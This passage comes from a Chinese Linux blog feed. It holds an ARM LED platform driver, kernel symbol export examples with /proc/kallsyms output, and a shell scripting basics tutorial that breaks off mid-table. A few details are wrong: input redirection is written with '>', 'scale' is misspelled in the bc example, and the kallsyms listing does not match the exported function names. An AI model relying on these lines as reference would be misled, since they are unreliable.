系统调用提供了发出设备特定命令的方法.</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">leds_dev</span> = &#123;</span></span><br><span class="line">.minor= MISC_DYNAMIC_MINOR,</span><br><span class="line">.fops= &amp;leds_ops,</span><br><span class="line">.name= <span class="string">"leds"</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">leds_probe</span><span class="params">(struct platform_device *pdev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret, i;</span><br><span class="line"><span class="keyword">char</span> *banner = <span class="string">"leds Initialize\n"</span>;</span><br><span class="line"></span><br><span class="line">printk(banner);<span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;LED_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">ret = gpio_request(led_gpios[i], <span class="string">"LED"</span>);</span><br><span class="line"><span class="keyword">if</span> (ret) &#123;</span><br><span class="line">printk(<span class="string">"%s: request GPIO %d for LED failed, ret = %d\n"</span>, DRIVER_NAME,</span><br><span class="line">led_gpios[i], ret);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s3c_gpio_cfgpin(led_gpios[i], S3C_GPIO_OUTPUT);</span><br><span class="line">gpio_set_value(led_gpios[i], <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = misc_register(&amp;leds_dev);</span><br><span class="line"><span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">printk(<span class="string">"leds:register device failed!\n"</span>);</span><br><span class="line"><span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>:</span><br><span class="line">misc_deregister(&amp;leds_dev);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">leds_remove</span> <span class="params">(struct platform_device *pdev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">misc_deregister(&amp;leds_dev);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">leds_suspend</span> <span class="params">(struct platform_device *pdev, <span class="keyword">pm_message_t</span> state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DPRINTK(<span class="string">"leds suspend:power off!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">leds_resume</span> <span class="params">(struct platform_device *pdev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DPRINTK(<span class="string">"leds resume:power on!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//rokcy 此结构体  即函数定义;   -- 针对不同信号响应信息;</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">platform_driver</span> <span class="title">leds_driver</span> = &#123;</span> <span class="comment">//驱动结构体;</span></span><br><span class="line">.probe = leds_probe, <span class="comment">//rokcy 驱动调用初始化;</span></span><br><span class="line">.remove = leds_remove, <span class="comment">//rocky 移除驱动函数</span></span><br><span class="line">.suspend = leds_suspend,<span class="comment">//rocky 休眠函数;</span></span><br><span class="line">.resume = leds_resume, <span class="comment">//休眠后恢复驱动</span></span><br><span class="line">.driver = &#123;</span><br><span class="line">.name = DRIVER_NAME, <span class="comment">// 与 注册设备 name 一致;</span></span><br><span class="line">.owner = THIS_MODULE,<span class="comment">// 赋值 THIS_MODULE</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __<span class="function"><span class="built_in">exit</span> <span class="title">leds_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">platform_driver_unregister(&amp;leds_driver);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">leds_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> platform_driver_register(&amp;leds_driver); <span class="comment">//[2] 驱动注册;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(leds_init); <span class="comment">//rocky 初始化加载;</span></span><br><span class="line">module_exit(leds_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"Dual BSD/GPL"</span>);</span><br></pre></td></tr></table></figure><p><br></p><h4 id="导出模块-以及符号的相互作用"><a href="#导出模块-以及符号的相互作用" class="headerlink" title="导出模块 以及符号的相互作用"></a>导出模块 以及符号的相互作用</h4><p>Linux2.6 内核的<code>/proc/kallsyms</code> 文件对应内核符号表，它记录了符号以及符号所在的内存地址，模块可以使用下列宏导到内核符号表中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXPORT_SYMBOL(符号名)                      任意模块均可</span><br><span class="line">EXPORT_SYMBOL_GPL(符号名)                  只使用包含GPL许可权的模块</span><br></pre></td></tr></table></figure><p><strong>示例：</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;linux/module.h&gt;    /*module_init()*/  </span><br><span class="line">#include &lt;linux/kernel.h&gt; /* printk() */  </span><br><span class="line">#include &lt;linux/init.h&gt;       /* __init __exit */  </span><br><span class="line">                 </span><br><span class="line">int add_test(int a ,int b)                                  </span><br><span class="line">&#123;                                  </span><br><span class="line">    return a + b;                               </span><br><span class="line">&#125;   </span><br><span class="line">                                 </span><br><span class="line">int sub_test(int a,int b)                                  </span><br><span class="line">&#123;                                  </span><br><span class="line">    return a - b;                               </span><br><span class="line">&#125;                              </span><br><span class="line">  </span><br><span class="line">EXPORT_SYMBOL(add_test);  </span><br><span class="line">EXPORT_SYMBOL(sub_test);  </span><br><span class="line">  </span><br><span class="line">MODULE_AUTHOR(&quot;Rocky&quot;);  </span><br><span class="line">MODULE_LICENSE(&quot;GPL&quot;);</span><br></pre></td></tr></table></figure><p>执行<code>cat /proc/kallsyms | grep test</code> 即可找到以下信息，表示模块确实加载到内核表中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f88c9008 r __ksymtab_sub_integar        [export_symb]  </span><br><span class="line">f88c9020 r __kstrtab_sub_integar         [export_symb]  </span><br><span class="line">f88c9018 r __kcrctab_sub_integar         [export_symb]  </span><br><span class="line">f88c9010 r __ksymtab_add_integar        [export_symb]  </span><br><span class="line">f88c902c r __kstrtab_add_integar          [export_symb]  </span><br><span class="line">f88c901c r __kcrctab_add_integar         [export_symb]  </span><br><span class="line">f88c9000 T add_tes                [export_symb]  </span><br><span class="line">f88c9004 T sub_tes                [export_symb]  </span><br><span class="line">13db98c9 a __crc_sub_integar           [export_symb]  </span><br><span class="line">e1626dee a __crc_add_integar           [export_symb]</span><br></pre></td></tr></table></figure><p><strong>在其它模块中可以引用此符号</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;    /*module_init()*/  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt; /* printk() */  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;       /* __init __exit */  </span></span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEBUG   <span class="comment">//open debug message  </span></span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINTK(fmt, arg...)     printk(KERN_WARNING fmt, ##arg)  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINTK(fmt, arg...)     printk(KERN_DEBUG fmt, ##arg)  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">add_test</span><span class="params">(<span class="keyword">int</span> a ,<span class="keyword">int</span> b)</span></span>;   </span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">sub_test</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;   </span><br><span class="line">  </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> a,b;  </span><br><span class="line">    </span><br><span class="line">  a = add_test(<span class="number">10</span>,<span class="number">20</span>);  </span><br><span class="line">  b = sub_test(<span class="number">30</span>,<span class="number">20</span>);  </span><br><span class="line">  PRINTK(<span class="string">"the add test result is %d"</span>,a);  </span><br><span class="line">  PRINTK(<span class="string">"the sub test result is %d\n"</span>,b);  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __<span class="function"><span class="built_in">exit</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">  PRINTK(<span class="string">" Hello World exit\n "</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">module_init(hello_init);  </span><br><span class="line">module_exit(hello_exit);  </span><br><span class="line">  </span><br><span class="line">MODULE_AUTHOR(<span class="string">"Rocky"</span>);  </span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br></pre></td></tr></table></figure><p><br></p><h4 id="platform-机制："><a href="#platform-机制：" class="headerlink" title="platform 机制："></a>platform 机制：</h4><ol><li><p>总线注册机制</p><ol><li><p>Kernel_init()</p></li><li><p>do_basic_setupo()</p></li><li><p>driver_init()</p></li><li><p>platform_bus_init()</p></li><li><p>bus_register()</p><p>注册系统platform总线.   内核启动初始化，自动维护。 </p></li></ol></li><li><p>添加设备阶段:</p><ol><li>Platform_device_register()</li><li>Platform_device_add()</li><li>pdev-&gt;dev.bus = &amp;platform_bus_type   &amp;&amp;  device_add()</li></ol><p>此步骤操作具体可以查看 $kernel/arch/arm/mach-exynos/mach-itop4412.c    </p></li><li><p>驱动注册阶段:</p><ol><li>Platform_driver_register()</li><li>driver_register()</li><li>bus_add_driver()</li><li>driver_attach()</li><li>bus_for_each_dev()</li></ol><p>对在每个挂载虚拟的platform bus的设备做 driver_attach（）-&gt; driver_probe_device() </p><p>判断drv-&gt;bus-&gt;match() 是否执行成功， 此时通过指针执行platform_match（）  对比name。</p></li></ol><p><br></p><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点:"></a>知识点:</h4><ol><li>proc 目录是虚拟文件系统， 可以为Linux用户空间和内核空间提供交互， 它存在于内存中， 而不占用实际的flash或者硬盘空间。</li><li>/proc/devices/ 里面的设备是加载驱动程序生成的， 即现有驱动创建信息。</li><li>/dev/ 下的设备是通过创建设备节点生成的。用户通过此设备节点访问内核驱动。 即系统挂载的实际设备。</li><li>/sys/devices/    里面的设备都是系统初始化， <code>make zImage</code> 编译后注册的新设备。</li><li>/proc/misc     查看pc机Ubuntu系统的杂项设备。</li><li>/sys/module  查看模块信息，  即lsmod信息</li></ol><p><a href="http://blog.chinaunix.net/uid-25014876-id-59420.html" target="_blank" rel="noopener">Linux_设备驱动</a></p><p><a href="http://blog.chinaunix.net/uid-25014876-id-111745.html" target="_blank" rel="noopener">platform设备驱动</a> </p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Arm </tag>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>基础语法</title>
      <link href="/2017/12/01/gram/shell/"/>
      <url>/2017/12/01/gram/shell/</url>
      
        <content type="html"><![CDATA[<p>本章讲解Linux shell基础语法知识与简单命令!</p><a id="more"></a><p><br></p><h3 id="Shell基础"><a href="#Shell基础" class="headerlink" title="Shell基础"></a>Shell基础</h3><h4 id="shell父子关系"><a href="#shell父子关系" class="headerlink" title="shell父子关系"></a>shell父子关系</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps --forest   ## 查看shell间的嵌套关系</span><br></pre></td></tr></table></figure><h5 id="进程列表"><a href="#进程列表" class="headerlink" title="进程列表"></a>进程列表</h5><p>在一行中指定依次运行的一系列命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwd; ls ; cd /etc; pwd; ls   ## 将会一次执行</span><br><span class="line"></span><br><span class="line">变形：</span><br><span class="line">(pwd; ls ; cd /etc; pwd; ls)   --&gt; 进程列表:  生成子shell来执行相应命令</span><br><span class="line">&#123;pwd; ls ; cd /etc; pwd; ls&#125;   --&gt; 进程分组:  并不会创建子shell</span><br></pre></td></tr></table></figure><p>验证:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(pwd; ls ; cd /etc; pwd; ls; echo $BASH_SUBSHELL)  --&gt; 会输出 1</span><br><span class="line">(pwd; ls; (echo $BASH_SUBSHELL))  --&gt; 输出 2   说明shell 层数    SHLVL：shell层数</span><br></pre></td></tr></table></figure><h5 id="后台模式-amp"><a href="#后台模式-amp" class="headerlink" title="后台模式 &amp;"></a>后台模式 &amp;</h5><h5 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">coproc My_Job &#123; sleep 10; &#125;  ## My_Job 扩展自己名字  多个协程通讯 命令才有意义</span><br><span class="line"></span><br><span class="line">示例:</span><br></pre></td></tr></table></figure><h4 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h4><h5 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">env </span><br><span class="line">printenv</span><br></pre></td></tr></table></figure><h5 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Linux 并未提供查看局部变量的命令</span><br><span class="line">set 会显示特定进程设置的所有环境变量, 包括局部变量,全局变量以及用户定义变量</span><br></pre></td></tr></table></figure><p><strong>设置局部变量后,在此shell进程中可以随意使用,但是在子shell中无法引用</strong></p><p>需要将其提升为全局变量,  export 命令完成, 提升并不会改变其值, 仅仅改变作用范围</p><h5 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unset varname</span><br></pre></td></tr></table></figure><h4 id="创建shell脚本"><a href="#创建shell脚本" class="headerlink" title="创建shell脚本"></a>创建shell脚本</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash      ## 指定使用的shell</span><br></pre></td></tr></table></figure><h5 id="命令替换"><a href="#命令替换" class="headerlink" title="命令替换  ``   $()"></a>命令替换  ``   $()</h5><p>  从命令输出中提取信息,并将其赋给变量;</p><ol><li>反引号(`)</li><li>$() 符号</li></ol><p><strong>命令替换会创建一个子shell来运行对应的命令, 该子shell所执行命令无法使用脚本中所创建的变量</strong>  </p><h4 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h4><ol><li><p>最基本的输出重定向将 命令的输出从显示器发送到指定文件中.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command &gt; outputfile  ## 将命令输出保存在指定文件中  ##  如果文件已经存在, 重定向操作符会用新的数据覆盖已有文件</span><br></pre></td></tr></table></figure></li><li><p>想要将命令的输出追加到已有文件中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command  &gt;&gt; outputfile</span><br></pre></td></tr></table></figure></li><li><p>变形: 清空文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span> outputfile</span><br></pre></td></tr></table></figure></li></ol><h4 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h4><p>输入重定向将文件的内容重定向到某个命令,而非将命令的输出重定向到文件。</p><ol><li><p>简单输入重定向</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command &gt; inputfile</span><br></pre></td></tr></table></figure></li><li><p><strong>内联输入重定向</strong> </p><p>无需使用文件进行重定向, 只需要在命令行中指定用于重定向的数据即可; </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">command &lt;&lt; marker</span><br><span class="line">data </span><br><span class="line">marker</span><br></pre></td></tr></table></figure><p>示例:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wc &lt;&lt; EOF</span><br><span class="line">test string 1</span><br><span class="line">test string 2</span><br><span class="line">test string 3</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></li></ol><h4 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h4><p>将一个命令的输出作为另一个命令的输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 | command2   ## 由管道串起来的命令不会一定会依次执行</span><br></pre></td></tr></table></figure><p>Linux 系统实际上会<strong>同时运行两个命令</strong>, 在系统内部将它们链接起来.在第一个命令产生输出的同时, 输出将会立即被送给第二个命令. <strong>数据传输不会用任何中间文件或缓冲区</strong></p><h4 id="执行数据运算"><a href="#执行数据运算" class="headerlink" title="执行数据运算"></a>执行数据运算</h4><h5 id="expr命令"><a href="#expr命令" class="headerlink" title="expr命令"></a>expr命令</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expr 1 + 5   ## 注意空格</span><br></pre></td></tr></table></figure><table><thead><tr><th>操作符</th><th>描述</th></tr></thead><tbody><tr><td>ARG1 \</td><td>ARG2</td><td>如果ARG1既不是null 也不是零值, 返回ARG1, 否则返回ARG2</td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td></tr></tbody></table><h5 id="使用方括号-operation"><a href="#使用方括号-operation" class="headerlink" title="使用方括号  $[ operation ]"></a>使用方括号  $[ operation ]</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span>[ operation ]</span><br><span class="line"></span><br><span class="line">示例:</span><br><span class="line"></span><br><span class="line">var=$[ 1 + 5 ]</span><br><span class="line">echo $var</span><br></pre></td></tr></table></figure><h5 id="浮点运算-bc"><a href="#浮点运算-bc" class="headerlink" title="浮点运算  bc"></a>浮点运算  bc</h5><ol><li><p>bc 计算器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scale   ## 设置小数位</span><br><span class="line"></span><br><span class="line">var=$(echo "scanle=4; 3.44 / 5" | bc)</span><br></pre></td></tr></table></figure></li></ol><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p><a href="https://www.jianshu.com/p/5f2b0ac8897a?utm_source=desktop&amp;utm_medium=timeline" target="_blank" rel="noopener">shell-字符串编程</a></p><h4 id="判断和读取字符串"><a href="#判断和读取字符串" class="headerlink" title="判断和读取字符串"></a>判断和读取字符串</h4><ul><li>\${var-default} 和 \${var=default} ：  如果var没有被声明，则使用\$default为其值</li></ul><h3 id="结构化命令"><a href="#结构化命令" class="headerlink" title="结构化命令"></a>结构化命令</h3><p>shell脚本中的命令施加一些逻辑流程控制, 根据条件使脚本跳过某些命令, 这样的命令称之为 结构化命令</p><h4 id="if-then-语句"><a href="#if-then-语句" class="headerlink" title="if-then 语句"></a>if-then 语句</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  if command </span><br><span class="line">  then </span><br><span class="line">     command </span><br><span class="line">  fi</span><br><span class="line"></span><br><span class="line">or:</span><br><span class="line"></span><br><span class="line">  if  command; then</span><br><span class="line">     commands</span><br><span class="line">  fi</span><br></pre></td></tr></table></figure><p><strong>shell 将运行if 后边的command, 如果该命令的退出返回码是0(命令运行成功) then 部分 command 将会被执行</strong></p><h4 id="if-then-else"><a href="#if-then-else" class="headerlink" title="if-then-else"></a>if-then-else</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if command</span><br><span class="line">then </span><br><span class="line"> command</span><br><span class="line">else</span><br><span class="line">command</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h4 id="嵌套if-then"><a href="#嵌套if-then" class="headerlink" title="嵌套if-then"></a>嵌套if-then</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if command;    then </span><br><span class="line">command</span><br><span class="line">elif  command; then</span><br><span class="line">command</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h4 id="test-命令"><a href="#test-命令" class="headerlink" title="test 命令 (),  (( )),  [],  [[ ]]"></a>test 命令 (),  (( )),  [],  [[ ]]</h4><ol><li><p>test 命令提供了在if-then 语句中测试不同条件的途径。  <strong>test命令中列出条件成立, test命令就会退出并返回退出状态码0</strong> </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test  condition  ## condition 是test命令的测试参数 与 值</span><br><span class="line"></span><br><span class="line">if test condition then; </span><br><span class="line">commands;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></li><li><p>[] 测试</p><p><strong>第一个方括号之后  和 第二个方括号之前必须加上空格, 否则报错</strong>  </p></li><li><p>(( expression ))   提供高级数学表达式</p></li></ol><table><thead><tr><th>符号</th><th>描述</th></tr></thead><tbody><tr><td>var++, var–, ++var, –var</td><td></td></tr><tr><td>!</td><td>逻辑求反</td></tr><tr><td>~</td><td>位求反</td></tr><tr><td>**</td><td>幂运算</td></tr><tr><td>&lt;&lt;</td><td>左移位</td></tr><tr><td>>></td><td>右移位</td></tr><tr><td>&amp;</td><td>位布尔和</td></tr><tr><td>\</td><td></td><td>位布尔或</td></tr><tr><td>&amp;&amp;</td><td>逻辑和</td></tr><tr><td>\</td><td>\</td><td></td><td>逻辑或</td></tr></tbody></table><p>   ​</p><ol><li><p>[[ expression ]]  提供字符串比较高级特性</p><p>可以使用<a href="">正则表达式</a>来匹配字符串</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if [[ $USER == li* ]]</span><br><span class="line">then </span><br><span class="line">echo "hello,Postgres"</span><br><span class="line">elif [[ $USER == lig?ng ]]</span><br><span class="line">then</span><br><span class="line">    echo "hello, Postgres"</span><br><span class="line">else</span><br><span class="line">    echo "Sorry, I do not kown you"</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>​</p></li></ol><p>test 命令可以判断三类条件:</p><ul><li>数值比较  <strong>只能处理整数</strong></li></ul><table><thead><tr><th>比较</th><th>描述</th></tr></thead><tbody><tr><td>n1   -eq  n2</td><td>检查n1是否 与 n2 相等</td></tr><tr><td>n1   -ge  n2</td><td>检查n1是否 大于或 等于 n2 相等</td></tr><tr><td>n1   -gt  n2</td><td>检查n1是否 大于 n2 相等</td></tr><tr><td>n1   -le  n2</td><td>检查n1是否 小于 或 等于 n2 相等</td></tr><tr><td>n1   -lt  n2</td><td>检查n1是否 小于 n2 相等</td></tr><tr><td>n1   -ne  n2</td><td>检查n1是否 不等于 n2 相等</td></tr></tbody></table><p>  ​</p><ul><li>字符串比较</li></ul><table><thead><tr><th>比较</th><th>描述</th></tr></thead><tbody><tr><td>str1 =  str2</td><td>检查str1 是否和 str2 相同</td></tr><tr><td>str1 !=  str2</td><td>检查str1 是否和 str2 不同</td></tr><tr><td>str1  &lt;  str2</td><td>检查str1 是否比 str2 小</td></tr><tr><td>str1 &gt;  str2</td><td>检查str1 是否比 str2 大</td></tr><tr><td>-n  str</td><td>检查str 的长度是否非 0</td></tr><tr><td>-z  str</td><td>检查str 的长度是否为 0</td></tr></tbody></table><p>  <strong>大于号 和 小于号必须转义</strong> ，否则shell会将其当做重定向操作符,将字符串当做文件名</p><p>  ​</p><ul><li>文件比较</li></ul><table><thead><tr><th>比较</th><th>描述</th></tr></thead><tbody><tr><td>-d  file</td><td>检查file是否存在并是一个目录</td></tr><tr><td>-e  file</td><td>检查file是否存在</td></tr><tr><td>-f  file</td><td>检查file是否存在并是一个文件</td></tr><tr><td>-r  file</td><td>检查file是否存在并可读</td></tr><tr><td>-s  file</td><td>检查file是否存在并非空</td></tr><tr><td>-w  file</td><td>检查file是否存在并可写</td></tr><tr><td>-x  file</td><td>检查file是否存在并可执行</td></tr><tr><td>-O  file</td><td>检查file是否存在并属当前用户所有</td></tr><tr><td>-G  file</td><td>检查file是否存在并且默认组 与 当前用户相同</td></tr><tr><td>file1 -nt file2</td><td>检查file1是否比file2新</td></tr><tr><td>file1 -ot file2</td><td>检查file1是否比file2旧</td></tr></tbody></table><p>  